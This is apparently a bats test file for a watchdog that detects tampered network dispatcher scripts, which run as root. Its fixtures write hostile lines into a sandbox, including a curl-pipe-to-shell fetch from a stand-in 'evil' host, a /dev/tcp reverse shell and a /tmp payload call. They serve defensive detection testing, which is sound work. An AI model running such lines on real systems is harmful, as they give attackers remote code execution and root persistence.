#!/usr/bin/env bats
# L2 bats functional tests for the network-dispatcher-watchdog scan script.
#
# NetworkManager / networkd-dispatcher run every script in their dispatcher
# dirs AS ROOT on network events (interface up/down, connectivity change) —
# an event-triggered exec surface reachable by toggling a network. The
# watchdog flags a dispatcher script that is world-writable / non-root, or
# whose body carries a high-risk injection pattern (shared module-lib set).
#
# This module is SDD-061 D-6 migrated (sources module-lib), so it is also
# exercised for the fail-loud module_lib_missing path. Runs the actual scan
# script with `logger` shadowed on PATH and the dispatcher dir in a tmp
# sandbox via SELFDEF_NETDISP_DIRS.
#
# Run with: bats packaging/test/L2-network-dispatcher-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/network-dispatcher-watchdog/systemd/network-dispatcher-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    DISPD="${TMP}/dispatcher.d"; mkdir -p "${DISPD}"
    SCRIPT="${DISPD}/10-benign"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_NETDISP_PROFILE="${PROFILE:-report}" \
    SELFDEF_NETDISP_BASELINE="${BASELINE}" \
    SELFDEF_NETDISP_DIRS="${DIRS:-$DISPD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no dispatcher dirs → ok / no_dispatcher_dirs" {
    DIRS="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_dispatcher_dirs"'
    cap | grep -q '"severity":"ok"'
}

@test "benign dispatcher script, first run → ok / baseline_initial" {
    printf '#!/bin/sh\nip route show\nlogger "iface $1 $2"\n' > "${SCRIPT}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged scripts on second run → ok / network_dispatcher_intact" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"network_dispatcher_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — injection pattern in a dispatcher script
# ============================================================

@test "a dispatcher script with a curl|sh payload → alert / network_dispatcher_suspicious" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd                                   # benign baseline
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"network_dispatcher_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a dispatcher script with a /dev/tcp reverse shell → alert" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a dispatcher script invoking a /tmp payload at command position → alert" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\n/tmp/.payload --run\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign script change → warn / network_dispatcher_changed" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\nip addr show\n' > "${SCRIPT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"network_dispatcher_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a benign dispatcher script is NOT flagged" {
    printf '#!/bin/sh\n# update resolv.conf on up\n[ "$2" = up ] && /usr/sbin/resolvconf -u\n' > "${SCRIPT}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-061 D-6 fail-loud
# ============================================================

@test "enforce profile exits non-zero on a suspicious script" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}
